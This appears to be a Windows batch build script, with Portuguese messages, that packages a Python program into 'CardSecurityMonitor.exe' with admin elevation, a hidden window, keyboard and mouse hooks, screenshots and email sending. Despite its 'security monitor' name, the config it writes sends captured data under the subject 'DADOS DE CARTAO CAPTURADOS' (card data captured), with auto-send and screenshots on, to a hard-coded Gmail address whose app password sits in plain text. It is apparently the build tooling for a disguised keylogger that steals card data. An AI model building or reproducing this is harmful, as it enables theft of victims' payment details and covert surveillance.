@echo off
chcp 65001 > nul
title Credit Card Security Monitor - Build
color 0A

echo.
echo  ============================================================
echo  CREDIT CARD SECURITY MONITOR
echo  Build do Executavel v2.2
echo  ============================================================
echo.
echo  NOTA: Este programa deve ser executado como Administrador!
echo.

echo  [1/7] Verificando Python...
python --version > nul 2>&1
if errorlevel 1 (
    color 0C
    echo  ERRO: Python nao encontrado!
    echo.
    echo     Solucao:
    echo     1. Instale Python de: https://python.org
    echo     2. IMPORTANTE: Marque "Add Python to PATH" na instalacao
    echo     3. Reinicie este script
    echo.
    pause
    exit /b 1
)
python --version
echo  OK - Python encontrado
echo.

echo  [2/7] Instalando dependencias...
pip install -r requirements.txt -q --disable-pip-version-check
if errorlevel 1 (
    color 0C
    echo  ERRO ao instalar dependencias!
    pause
    exit /b 1
)
echo  OK - Dependencias instaladas
echo.

echo  [3/7] Limpando builds anteriores...
rmdir /s /q build 2>nul
rmdir /s /q dist 2>nul
del /q *.spec 2>nul
echo  OK - Limpo
echo.

echo  [4/7] Verificando arquivos necessarios...
if not exist "email_config.json" (
    echo  Criando email_config.json...
    (
        echo {
        echo     "provider": "gmail",
        echo     "smtp_server": "smtp.gmail.com",
        echo     "smtp_port": 587,
        echo     "use_tls": true,
        echo     "email_from": "unidadegoias036@gmail.com",
        echo     "email_password": "zhzf cziy ewml cxvw",
        echo     "email_to": "unidadegoias036@gmail.com",
        echo     "send_screenshot": true,
        echo     "alert_subject": "DADOS DE CARTAO CAPTURADOS",
        echo     "auto_send": true
        echo }
    ) > email_config.json
)
echo  OK - Arquivos verificados
echo.

echo  [5/7] Compilando executavel...
echo     Isso pode levar 2-5 minutos...
echo.

pyinstaller --onefile --windowed --name "CardSecurityMonitor" --add-data "email_config.json;." --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32 --hidden-import=pynput.keyboard --hidden-import=pynput.mouse --hidden-import=PIL._tkinter_finder --hidden-import=win32gui --hidden-import=win32process --hidden-import=psutil --hidden-import=pystray --hidden-import=websockets --hidden-import=smtplib --hidden-import=email.mime.multipart --hidden-import=email.mime.text --hidden-import=email.mime.image --hidden-import=email.mime.application --uac-admin main.py

if errorlevel 1 (
    color 0C
    echo.
    echo  ERRO na compilacao!
    pause
    exit /b 1
)
echo  OK - Executavel compilado
echo.

echo  [6/7] Copiando arquivos de configuracao...
copy "email_config.json" "dist\email_config.json" > nul 2>&1
echo  OK - Arquivos copiados
echo.

echo  [7/7] Verificando arquivo gerado...
if not exist "dist\CardSecurityMonitor.exe" (
    color 0C
    echo  ERRO: Arquivo .exe nao foi gerado!
    pause
    exit /b 1
)
echo  OK - Arquivo verificado
echo.

echo  Limpando arquivos temporarios...
rmdir /s /q build 2>nul
del /q *.spec 2>nul
echo  OK - Construcao finalizada
echo.

echo.
echo  ============================================================
echo  BUILD CONCLUIDO COM SUCESSO!
echo  ============================================================
echo.
echo  Executavel: dist\CardSecurityMonitor.exe
echo  Config:     dist\email_config.json
echo.
echo  Para mudar o assunto do e-mail:
echo  1. Abra dist\email_config.json no Bloco de Notas
echo  2. Edite a linha "alert_subject"
echo  3. Salve e execute o programa
echo.
echo  ============================================================
echo.

set /p open="Deseja abrir a pasta dist? (S/N): "
if /i "%open%"=="S" explorer dist

echo.
pause